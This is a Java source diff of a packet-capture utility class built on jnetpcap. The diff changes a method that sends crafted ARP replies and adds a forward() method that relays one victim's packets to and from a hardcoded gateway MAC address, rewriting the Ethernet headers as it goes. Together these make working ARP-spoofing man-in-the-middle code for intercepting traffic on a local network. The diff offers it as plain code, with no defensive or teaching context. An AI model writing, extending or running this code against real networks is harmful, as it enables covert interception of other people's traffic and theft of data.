@@ -5,9 +5,16 @@ import org.jnetpcap.PcapBpfProgram;
 import org.jnetpcap.PcapIf;
 import org.jnetpcap.packet.JMemoryPacket;
 import org.jnetpcap.packet.JPacket;
+import org.jnetpcap.packet.PcapPacket;
+import org.jnetpcap.packet.PcapPacketHandler;
+import org.jnetpcap.packet.format.FormatUtils;
 import org.jnetpcap.protocol.JProtocol;
+import org.jnetpcap.protocol.lan.Ethernet;
+import org.jnetpcap.protocol.network.Ip4;
+
 import java.io.IOException;
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.HashMap;
 import java.util.List;
 
@@ -19,8 +26,8 @@ public class PcapUtils {
 
     public static Pcap pcap;
     public static Integer index;
-    private static List<PcapIf> alldevs;
-    private static StringBuilder errbuf = new StringBuilder();
+    public static List<PcapIf> alldevs;
+    public static StringBuilder errbuf = new StringBuilder();
     public static HashMap<Integer, HashMap<String, String>> ipMacMap = new HashMap<Integer, HashMap<String, String>>();
 
     public static List<PcapIf> getAllDevs() {
@@ -202,7 +209,7 @@ public class PcapUtils {
         }).start();
     }
 
-    public static void arpResponse(String sourceIp, String sourceMac, String destinationIp, String destinationMac,
+    public static void arpResponse(Pcap pcap, String sourceIp, String sourceMac, String destinationIp, String destinationMac,
                                    String realMac) {
         String responseToOther = destinationMac + sourceMac
                 + ConstantUtils.Ethernet.ETHER_TYPE_ARP.getValue()
@@ -242,13 +249,6 @@ public class PcapUtils {
         System.out.println(responseToOtherPacket.toString());
         System.out.println(responseToMePacket.toString());
 
-        PcapIf device = alldevs.get(index);
-
-        int snaplen = 64 * 1024;
-        int flags = Pcap.MODE_PROMISCUOUS;
-        int timeout = 10 * 1000;
-        Pcap pcap = Pcap.openLive(device.getName(), snaplen, flags, timeout, errbuf);
-
         new Thread(new Runnable() {
             @Override
             public void run() {
@@ -267,5 +267,49 @@ public class PcapUtils {
                 }
             }
         }).start();
+    }
+
+    public static void forward(Pcap pcap, String sourceIp, String sourceMac) {
+        String gatewayMac = "c4 36 55 92 c0 05";
+        String localMac = PcapUtils.ipMacMap.get(index).get("MAC").toLowerCase().replace("-", " ");
+        PcapPacketHandler pcapPacketHandler = new PcapPacketHandler() {
+
+            @Override
+            public void nextPacket(PcapPacket pcapPacket, Object o) {
+
+                final JPacket packet = new JMemoryPacket(Ethernet.ID, pcapPacket);
+                Ethernet ethernet = packet.getHeader(new Ethernet());
+                Ip4 ip4 = new Ip4();
+                if (packet.hasHeader(ip4)) {
+                    if (FormatUtils.ip(ip4.source()).equals(sourceIp) && Arrays.equals(ethernet.destination(),
+                            ConvertUtils.macToByteArray(localMac, " "))) {
+                        byte[] sourceMacByte = ConvertUtils.macToByteArray(localMac, " ");
+                        byte[] destinationMacByte = ConvertUtils.macToByteArray(gatewayMac, " ");
+                        ethernet.source(sourceMacByte);
+                        ethernet.destination(destinationMacByte);
+                        ethernet.checksum(ethernet.calculateChecksum());
+                        packet.scan(Ethernet.ID);
+                        if (PcapUtils.pcap.sendPacket(packet) != Pcap.OK) {
+                            System.out.println(PcapUtils.pcap.getErr());
+                        }
+                    }
+                    if (FormatUtils.ip(ip4.destination()).equals(sourceIp) && Arrays.equals(ethernet.source(),
+                            ConvertUtils.macToByteArray(gatewayMac, " "))) {
+                        byte[] sourceMacByte = ConvertUtils.macToByteArray(localMac, " ");
+                        byte[] destinationMacByte = ConvertUtils.macToByteArray(sourceMac, " ");
+                        ethernet.source(sourceMacByte);
+                        ethernet.destination(destinationMacByte);
+                        ethernet.checksum(ethernet.calculateChecksum());
+                        packet.scan(Ethernet.ID);
+                        if (pcap.sendPacket(packet) != Pcap.OK) {
+                            System.out.println(PcapUtils.pcap.getErr());
+                        }
+                    }
+                } else {
+                    return;
+                }
+            }
+        };
+        pcap.loop(-1, pcapPacketHandler, "likang");
     }
 }
